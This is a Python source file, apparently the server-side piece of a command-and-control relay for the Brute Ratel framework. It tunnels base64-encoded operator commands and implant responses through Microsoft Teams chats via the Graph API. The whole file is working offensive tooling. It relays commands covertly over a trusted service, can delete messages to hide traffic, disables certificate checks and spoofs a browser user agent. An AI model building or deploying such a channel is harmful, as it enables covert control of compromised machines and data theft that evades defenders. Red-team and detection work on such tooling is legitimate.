import requests
import json
import base64
import time
import datetime
import re
import logging
import urllib3
from requests.exceptions import HTTPError, ConnectionError, Timeout, RequestException

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # Disable SSL warnings

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

class TeamsC2:
    def __init__(self, config):
        self.username = config['username']
        self.password = config['password']
        self.tenant_id = config['tenant_id']
        self.client_id = config['client_id']
        self.auto_delete_messages = config['auto_delete_messages']
        self.max_message_size = config['max_message_size']
        self.partial_message_detector = config['partial_message_detector']
        self.server_url = config['server_url']
        self.proxy = config['proxy']
        self.user_agent = config['User-Agent']
        
        self.auth_url = "https://login.microsoftonline.com/{tenant_id}/oauth2/v2.0/token"
        self.chat_url = "https://graph.microsoft.com/v1.0/chats"
        self.messages_url = "https://graph.microsoft.com/v1.0/chats/{chat_id}/messages"
        self.delete_message_url = "https://graph.microsoft.com/v1.0/users/{user_id}/chats/{chat_id}/messages/{message_id}/softDelete"
        self.get_user_url = "https://graph.microsoft.com/v1.0/me"
        
        self.user_access_token = None
        self.chat_id = None
        self.last_message_id = None
        self.user_id_me = None
        self.target_user_id = config['target_user_id']
        self.received_chunks = []
        self.token_expires_in = None  # Time when token will expire

    def get_user_access_token(self):
        try:
            headers = {
                "User-Agent": self.user_agent
            }
            data = {
                "client_id": self.client_id,
                "scope": "https://graph.microsoft.com/.default",
                "username": self.username,
                "password": self.password,
                "grant_type": "password"
            }
            response = requests.post(self.auth_url.format(tenant_id=self.tenant_id), headers=headers, data=data, proxies=self.proxy, verify=False)
            response.raise_for_status()
            token_response = response.json()
            self.user_access_token = token_response["access_token"]
            # Calculate when the token will expire based on the expires_in value provided
            expires_in = token_response.get("expires_in", 3600)  # Fallback to 1 hour if not specified
            self.token_expires_in = datetime.datetime.now() + datetime.timedelta(seconds=expires_in)
            logging.info("User Access token obtained successfully.")
        except (HTTPError, ConnectionError, Timeout, RequestException) as e:
            logging.error(f"Failed to obtain access token: {str(e)}")
    
    def token_is_valid(self):
        """ Check if the current token is still valid """
        if not self.user_access_token or datetime.datetime.now() >= self.token_expires_in:
            return False
        return True

    def ensure_token(self):
        """ Ensure the token is valid before making a request """
        if not self.token_is_valid():
            self.get_user_access_token()

    def create_chat(self):
        self.ensure_token()
        try:
            headers = self._get_headers()
            data = self._get_chat_data()
            response = requests.post(self.chat_url, headers=headers, data=json.dumps(data), proxies=self.proxy, verify=False)
            response.raise_for_status()
            self.chat_id = response.json()["id"]
            logging.info(f"Chat created successfully. Chat ID: {self.chat_id}")
        except (HTTPError, ConnectionError, Timeout, RequestException) as e:
            logging.error(f"Failed to create chat: {str(e)}")

    def get_new_messages(self):
        self.ensure_token()
        try:
            headers = self._get_headers()
            response = requests.get(self.messages_url.format(chat_id=self.chat_id) + "?$top=1&$orderby=createdDateTime desc", headers=headers, proxies=self.proxy, verify=False)
            response.raise_for_status()
            messages = response.json()["value"]
            return messages
        except (HTTPError, ConnectionError, Timeout, RequestException) as e:
            logging.error(f"Failed to retrieve messages: {str(e)}")
            return []

    def delete_message(self, message_id, timeout=2):
        self.ensure_token()
        try:
            headers = self._get_headers()
            time.sleep(timeout)  # Delay before deleting the message
            response = requests.post(self.delete_message_url.format(user_id=self.user_id_me, chat_id=self.chat_id, message_id=message_id), headers=headers, proxies=self.proxy, verify=False)
            response.raise_for_status()
            logging.info(f"Message {message_id} deleted successfully.")
        except (HTTPError, ConnectionError, Timeout, RequestException) as e:
            logging.error(f"Failed to delete message {message_id}: {str(e)}")

    def send_message(self, message_content):
        self.ensure_token()
        try:
            headers = self._get_headers(content_type="application/json")
            data = {
                "body": {
                    "contentType": "text",
                    "content": message_content
                }
            }
            time.sleep(1)  # Delay before sending the message
            response = requests.post(self.messages_url.format(chat_id=self.chat_id), headers=headers, data=json.dumps(data), proxies=self.proxy, verify=False)
            response.raise_for_status()
            message_id = response.json()["id"]
            logging.info("Message sent successfully.")
            return message_id
        except (HTTPError, ConnectionError, Timeout, RequestException) as e:
            logging.error(f"Failed to send message: {str(e)}")
            return None

    def send_response(self, response_data):
        if len(response_data) > self.max_message_size:
            # Split the response data into chunks
            chunks = [response_data[i:i + self.max_message_size] for i in range(0, len(response_data), self.max_message_size)]
            
            # Send the first chunk with the partial message detector
            first_chunk = f"{self.partial_message_detector}{chunks[0]}"
            message_id = self.send_message(first_chunk)
            
            # Send the remaining chunks as replies to the first message
            for chunk in chunks[1:-1]:
                self.send_message(f"{self.partial_message_detector}{chunk}")
            
            # Send the last chunk without the partial message detector
            self.send_message(chunks[-1])
        else:
            # Send the entire response data as a single message
            message_id = self.send_message(response_data)
            if self.auto_delete_messages and message_id:
                self.delete_message(message_id)

    def get_user_id(self):
        self.ensure_token()
        try:
            headers = self._get_headers()
            response = requests.get(self.get_user_url, headers=headers, proxies=self.proxy, verify=False)
            response.raise_for_status()
            self.user_id_me = response.json()["id"]
        except (HTTPError, ConnectionError, Timeout, RequestException) as e:
            logging.error(f"Failed to retrieve user ID: {str(e)}")

    def process_server_response(self, server_response):
        if server_response.status_code == 200:
            response_data = server_response.content.decode()
            if response_data:
                self.send_response(response_data)
            else:
                self.send_response("empty")
        else:
            logging.error(f"Failed to send message to the server. Status code: {server_response.status_code}")

    def process_new_messages(self):
        new_messages = self.get_new_messages()
        if new_messages:
            message = new_messages[0]  # Get the latest message
            message_id = message["id"]
            if message_id != self.last_message_id:
                self.last_message_id = message_id
                if message["from"]["user"]["id"] != self.user_id_me:
                    message_content = re.sub(r'<[^>]*>', '', message['body']['content'])  # Strip HTML
                    logging.info(f"New message received: {message_content}")

                    is_partial = self.partial_message_detector in message_content
                    cleaned_content = message_content.replace(self.partial_message_detector, "") if is_partial else message_content

                    if is_partial:
                        logging.info("Received partial message.")
                        self.received_chunks.append(cleaned_content)
                    else:
                        if self.received_chunks:
                            logging.info("Received the final chunk of a partial message.")
                            # Concatenate all parts
                            self.received_chunks.append(cleaned_content)
                            complete_data = ''.join(self.received_chunks)
                            self.received_chunks = []  # Clear the chunks
                        else:
                            logging.info("Received a complete message.")
                            complete_data = cleaned_content

                        # Decode and process the complete data
                        try:
                            decoded_content = base64.b64decode(complete_data).hex().lower()
                            server_response = requests.post(self.server_url, data=decoded_content, proxies=self.proxy, verify=False)  # Here we send request to BRC4
                            self.process_server_response(server_response)
                        except (base64.binascii.Error, ValueError) as e:
                            logging.error(f"Failed to decode message content: {str(e)}")
                else:
                    logging.info("Ignoring own message.")
        else:
            logging.info("No new messages.")

    def run(self):
        self.get_user_access_token()
        self.get_user_id()
        self.create_chat()
        self.send_message("nothing here!")
        
        logging.info("TeamsC2 initialized successfully")
        logging.info("Listening for incoming commands...")
        while True:
            try:
                self.process_new_messages()
                time.sleep(0.5)  # Delay between each check for new messages
            except Exception as e:
                logging.error(f"An error occurred: {str(e)}")

    def _get_headers(self, content_type=None):
        headers = {
            "User-Agent": self.user_agent,
            "Authorization": f"Bearer {self.user_access_token}"
        }
        if content_type:
            headers["Content-Type"] = content_type
        return headers

    def _get_chat_data(self):
        return {
            "chatType": "oneOnOne",
            "members": [
                {
                    "@odata.type": "#microsoft.graph.aadUserConversationMember",
                    "roles": ["owner"],
                    "user@odata.bind": f"https://graph.microsoft.com/v1.0/users('{self.user_id_me}')"
                },
                {
                    "@odata.type": "#microsoft.graph.aadUserConversationMember",
                    "roles": ["owner"],
                    "user@odata.bind": f"https://graph.microsoft.com/v1.0/users('{self.target_user_id}')"
                }
            ]
        }

def main():
    """
    The chat created is between server-c2 and connector-c2.

    The server-c2 is responsible for handling the incoming commands from brute ratel and also sending the commands to the connnector-c2 as well as handling all other requests from the connector-c2.
    """
    config = {
        'username': 'xxxxxxxxxx',
        'password': 'xxxxxxxxxx',
        'tenant_id': 'xxxxxxxxxx',
        'client_id': 'xxxxxxxxxx',
        'auto_delete_messages': False,
        'max_message_size': 10000,
        'target_user_id': 'xxxxxxxxxx', # Replace with chat recipient's user ID
        'partial_message_detector': 'partialMessageDetector',
        'server_url': 'http://localhost:10443/test', # Ratel server URL
        'proxy': None,
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36'
        #'proxy': { "http" : "http://127.0.0.1:8080", "https" : "http://127.0.0.1:8080" }
    }
    
    teams_c2 = TeamsC2(config)
    teams_c2.run()

if __name__ == "__main__":
    main()
